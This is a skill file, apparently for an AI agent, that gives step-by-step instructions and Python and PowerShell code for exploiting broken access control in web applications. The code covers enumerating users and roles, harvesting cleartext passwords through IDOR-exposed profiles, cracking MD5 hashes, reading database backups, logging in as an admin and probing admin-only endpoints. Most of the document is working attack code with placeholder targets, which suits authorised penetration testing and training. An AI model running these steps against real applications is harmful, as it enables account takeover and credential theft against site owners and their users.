---
name: broken-access-control
description: 'Exploit broken access control in web applications by escalating privileges through credential reuse, role-based bypass, and exploiting weak authorisation on privileged endpoints. Covers horizontal and vertical privilege escalation via stolen or leaked credentials. USE FOR: privilege escalation, login as admin, access admin panel, bypass role checks, credential stuffing from leaked data, vertical escalation, broken function-level authorisation, access admin-only features. DO NOT USE FOR: IDOR on same-role resources (use idor-exploitation skill), authentication bypass without credentials, brute forcing login (use zip-password-cracking patterns), SQL injection.'
argument-hint: 'Target login URL, known credentials, and the privilege level to reach (e.g. "escalate to admin using leaked credentials on this app")'
---

# Broken Access Control Exploitation

> **Prerequisite:** Python 3 with `requests`. At least one valid set of credentials and knowledge of higher-privilege accounts.

## Step 1 — Enumerate Users and Roles

Identify user accounts and their privilege levels. Common information sources:

- **User listing endpoints** — `/api/users` may expose role fields
- **Profile responses** — role/group fields in API responses
- **JavaScript bundles** — role checks in frontend code reveal the role hierarchy
- **Database exports** — if accessible, contain definitive role assignments

```python
import requests, json

headers = {"Authorization": "Bearer <token>"}
resp = requests.get("<target>/api/users/", headers=headers)
users = resp.json()

for u in users:
    role = u.get('role', u.get('user_type', u.get('is_admin', 'unknown')))
    print(f"{u['username']:20s} role={role}")
```

Map the role hierarchy from frontend code:

```powershell
# Search for role/permission checks in JS bundles
Select-String -Path bundle.js -Pattern '(ADMIN|SUPER_ADMIN|MODERATOR|USER|role|permission|isAdmin|isSuperAdmin)' -AllMatches
```

## Step 2 — Obtain Higher-Privilege Credentials

### From IDOR-Leaked Data
If profile endpoints expose passwords or password hashes (see `idor-exploitation` skill):

```python
# Fetch each user's profile looking for credential fields
for username in target_users:
    resp = requests.get(f"<target>/api/profile/?user={username}", headers=headers)
    data = resp.json()
    pw = data.get('clear_text_password') or data.get('password')
    if pw:
        print(f"{username}: {pw}")
```

### From Cracked Hashes
If you have password hashes from a user listing:

```python
import hashlib

# Try common passwords against MD5/SHA hashes
wordlist = open('wordlist.txt').read().splitlines()
for word in wordlist:
    md5 = hashlib.md5(word.encode()).hexdigest()
    if md5 in known_hashes:
        user = known_hashes[md5]
        print(f"CRACKED: {user} = {word}")
```

### From Database Backups
If the app exposes database download endpoints (see `sensitive-data-exposure` skill):

```python
import sqlite3
conn = sqlite3.connect('backup.db')
cursor = conn.execute("SELECT username, password, clear_text_password, role FROM auth_user")
for row in cursor:
    print(row)
```

## Step 3 — Authenticate as the Higher-Privilege User

```python
# Login as the admin/privileged user
login_body = {"username": "<admin_user>", "password": "<admin_password>"}
resp = requests.post("<target>/api/token/", json=login_body, headers={
    "X-Signature": compute_signature(login_body)  # if required
})

token_data = resp.json()
admin_token = token_data.get("access") or token_data.get("token")
print(f"Admin token obtained: {admin_token[:20]}...")
```

## Step 4 — Access Privileged Features

Test admin-only endpoints and features:

```python
admin_headers = {
    "Authorization": f"Bearer {admin_token}",
    "X-Signature": "<sig>"
}

# Common admin endpoints
admin_endpoints = [
    "/api/admin/",
    "/api/backup/",
    "/api/config/",
    "/api/logs/",
    "/api/users/manage/",
    "/admin/",
    "/dashboard/admin",
]

for endpoint in admin_endpoints:
    resp = requests.get(f"<target>{endpoint}", headers=admin_headers)
    print(f"{endpoint:40s} → {resp.status_code}")
    if resp.status_code == 200:
        print(f"  Content-Type: {resp.headers.get('content-type')}")
        print(f"  Size: {len(resp.content)} bytes")
```

## Step 5 — Verify Escalation in the UI

Navigate the application as the privileged user to discover features hidden from lower roles:

- **Admin panels** — new buttons, menu items, or dashboard sections
- **Management features** — user management, database operations, file access
- **Configuration** — system settings, API keys, service credentials
- **Data export** — backup downloads, report generation

## Step 6 — Test for Missing Function-Level Checks

Even without valid admin credentials, try accessing admin endpoints directly:

```python
# Use a regular user's token on admin endpoints
user_headers = {"Authorization": f"Bearer {regular_token>}"}

resp = requests.get("<target>/api/backup/", headers=user_headers)
if resp.status_code == 200:
    print("BROKEN: Admin endpoint accessible to regular user!")

resp = requests.get("<target>/api/admin/users/", headers=user_headers)
if resp.status_code == 200:
    print("BROKEN: User management accessible to regular user!")
```

## Common Pitfalls

- **Frontend-only enforcement** — buttons may be hidden via CSS/JS but the API endpoints are unprotected. Always test the API directly.
- **Token expiry** — JWT tokens expire; re-authenticate if you get 401s.
- **Role caching** — some apps cache roles in the JWT payload. Check the JWT claims with `jwt.io` or `base64 -d` on the payload segment.
- **Multiple role systems** — the app may have both `role` and `is_staff`/`is_superuser` fields that are checked independently.
- **Session vs token auth** — some admin panels use session cookies while the API uses JWTs. Test both authentication methods.
